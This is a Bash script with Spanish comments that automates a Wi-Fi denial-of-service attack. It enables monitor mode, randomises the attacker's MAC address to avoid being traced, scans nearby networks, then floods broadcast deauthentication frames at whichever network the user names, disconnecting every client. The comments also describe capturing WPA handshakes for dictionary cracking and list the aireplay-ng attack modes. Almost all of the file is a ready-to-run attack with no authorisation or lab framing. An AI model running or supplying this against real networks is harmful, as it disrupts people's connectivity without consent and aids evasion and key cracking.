# Programa en bash para echar a todos los usuarios de una red determinada - (https://github.com/Marcelorvp/networkAttack)

# Copyright (c) 2016 Marcelo Raúl Vázquez Pereyra

#!/bin/bash

# ¡¡Debes de ejecutar el programa siendo superusuario!!
networkAttack(){

  echo " "
  echo "Abriendo configuración de interfaz..."
  echo " "
  sleep 2
  ifconfig
  echo " "
  echo "Iniciando modo monitor..."
  sleep 2

  # Cuanto estás en modo monitor, se te permite escuchar y capturar cualquier
  # tipo de paquete que viaje por el aire. De esta forma capturarás no sólo
  # las direcciones MAC tanto de routters como de clientes conectados, sino
  # también las de aquellos que no pertenezcan a ninguna red, pudiendo
  # posteriormente realizar por ejemplo una falsa autenticación.

  airmon-ng start wlp2s0 # Modo monitor iniciado en la interfaz wlp2s0
  echo " "
  echo "Dando de baja la interfaz mon0"
  echo " "
  sleep 2

  # Para realizar un ataque de forma más segura, lo mejor es cambiar la dirección
  # MAC de tu propio ordenador, por lo menos en la interfaz en la que vamos a
  # trabajar, es decir... la mon0 que acabamos de crear. Para ello, siempre que
  # queramos cambiar la dirección MAC en una interfaz debemos de darla de
  # baja primero, de lo contrario no se nos permitirá.

  ifconfig mon0 down
  echo "Cambiando direccion MAC..."
  echo " "
  sleep 2

  # El comando que usamos a continuación sirve para cambiar nuestra dirección
  # MAC, macchanger (es un programa que necesitamos instalar -> 'sudo apt-get install
  # macchanger') nos otorga una MAC aleatoria nueva mediante el uso de '-a'. debemos
  # indicar siempre al final la interfaz en la que estamos trabajando y en la que
  # queremos efectuar el cambio. Haciendo uso de 'macchanger -s mon0' podríacabamos
  # ver si nuestra MAC ha sido cambiada con éxito. Además de mostrarte la nueva, te
  # mostrará la permanente, que es la que volverás a tener una vez cierres el
  # modo monitor.

  macchanger -a mon0
  echo " "
  echo "Dando de alta la interfaz mon0"
  echo " "
  sleep 2
  ifconfig mon0 up # Damos de alta nuevamente el modo monitor
  echo "Iniciando Escaneo de Redes Wifi Cercanas..."
  echo " "
  sleep 3

  # 'airodump-ng' pertenece a 'aircrack-ng', un programa que debemos instalarnos
  # desde la terminal mediante -> 'sudo apt-get install aircrack-ng'. Con este
  # también es posible deautenticar a usuarios para posteriormente mediante
  # fuerza bruta y con el uso de diccionarios obtener la clave de una red Wifi
  # de protocolo WPA/WPA2 y de autenticación PSK (clave precompartida). También
  # es posible mediante este programa trabajar con protocolos WEP, pero estos
  # no necesitan de diccionarios para obtener la contraseña, pues son los más
  # fáciles de romper.

  airodump-ng mon0 # 'Scanner' de redes en modo monitor, capturaremos todo
  echo " "
  echo -n "Introduce el nombre del Wifi que desea atacar: "
  read wifiName
  echo " "
  echo "A usted elegido atacar $wifiName"
  echo " "
  sleep 4

  # A continuación usaremos 'aireplay-ng' para inyectar paquetes.
  # Su función principal es generar tráfico para usarlo más tarde con aircrack-ng
  # y poder así crackear claves WEP y WPA-PSK. Tampoco será necesario puesto que
  # lo que haremos será mandar deautenticaciones. Hay varios ataques diferentes
  # que se pueden utilizar para hacer deautenticaciones con el objetivo de capturar
  # un handshake WPA, para realizar una falsa autenticación, un reenvio interactivo
  # de un paquete, o una reinyección automática de un ARP-request.
  # También está el programa 'packetforge-ng', con el que es posible crear paquetes
  # “ARP request” de forma arbitraria, pero nos centraremos en aircrack.

  aireplay-ng -0 0 -e $wifiName -c FF:FF:FF:FF:FF:FF --ignore-negative-one mon0

  # Otra forma de usar el mismo comando por parámetros es la siguiente:
  # aireplay-ng --deauth 200000 -e $wifiName --ignore-negative-one mon0, donde se manda
  # un broadcast que emite tráfico hacia todos los usuarios que estén conectados
  # a la misma red que hayamos pasado como parámetro.
  # ----------------------------------------------------------
  #  Ataque 0: Deautenticación
  #  Ataque 1: Falsa autenticación
  #  Ataque 2: Selección interactiva del paquete a enviar
  #  Ataque 3: Reinyección de una petición ARP (ARP-request)
  #  Ataque 4: Ataque chopchop
  #  Ataque 5: Ataque de Fragmentación
  #  Ataque 6: Ataque Cafe-latte
  #  Ataque 7: Ataque de fragmentación orientada al cliente
  #  Ataque 8: Modo de migración WPA
  #  Ataque 9: Prueba de inyección
  # -----------------------------------------------------------

  # Otra cosa que podemos hacer para no liarnos con el resto de ESSID's, es
  # fijar simplemente la red que queramos, así las demás no se filtrarán. Esto
  # podemos hacerlo con: "airodump-ng -c 'número del canal en el que está la red'
  # --essid 'nombre del WiFi' mon0" y luego mandar el comando aireplay-ng.

  # 'ignore-negative-one' se pone porque en ocasiones al ponernos a escuchar en
  # un channel, nos figura que nuestra interfáz se encuentra en -1, se debe
  # a un problema interno del programa, por tanto añadiendo esta opción nos 'ignora'
  # el error.

  }

analisisWifi(){

  # Basándonos en los mismos comandos anteriores, simplemente escaneamos las redes.

  echo " "
  echo "Abriendo configuración de interfaz..."
  echo " "
  sleep 2
  ifconfig
  echo " "
  echo "Iniciando modo monitor..."
  sleep 2
  airmon-ng start wlp2s0
  echo " "
  echo "Dando de baja la interfaz mon0"
  echo " "
  sleep 2
  ifconfig mon0 down
  echo "Cambiando direccion MAC..."
  echo " "
  sleep 2
  macchanger -a mon0
  echo " "
  echo "Dando de alta la interfaz mon0"
  echo " "
  sleep 2
  ifconfig mon0 up
  echo "Iniciando Escaneo de Redes Wifi Cercanas..."
  echo " "
  sleep 3
  airodump-ng mon0

}

quitMonitor(){

  # Recordemos que teníamos la MAC cambiada, por tanto la forma de volver a la
  # permanente es eliminando el modo monitor.

  echo " "
  echo "Se va a eliminar el modo monitor"
  sleep 3
  airmon-ng stop mon0
  echo " "

}

interfaces(){

  echo " "
  echo "Analizando interfaces..."
  echo " "
  sleep 3
  ifconfig
  sleep 5

}

while true
   do

	clear
	echo " "
	echo "*** Menú Principal***"
	echo " "
	echo "1. Atacar Red Wifi"
	echo "2. Analizar Redes Wifi"
	echo "3. Quitar Modo Monitor"
  echo "4. Ver interfaces"
	echo "-----------------------------------"
  echo "0. Salir"
	echo "-----------------------------------"
	echo " "
	echo -n "Introduzca una opcion: "
	read opcionMenu

	if [ "$opcionMenu" = "1" ]; then
	networkAttack
	fi
	if [ "$opcionMenu" = "2" ]; then
	analisisWifi
	fi
	if [ "$opcionMenu" = "3" ]; then
	quitMonitor
	fi
	if [ "$opcionMenu" = "4" ]; then
	interfaces
	fi
	if [ "$opcionMenu" = "0" ]; then
  echo " "
  exit
  fi

done
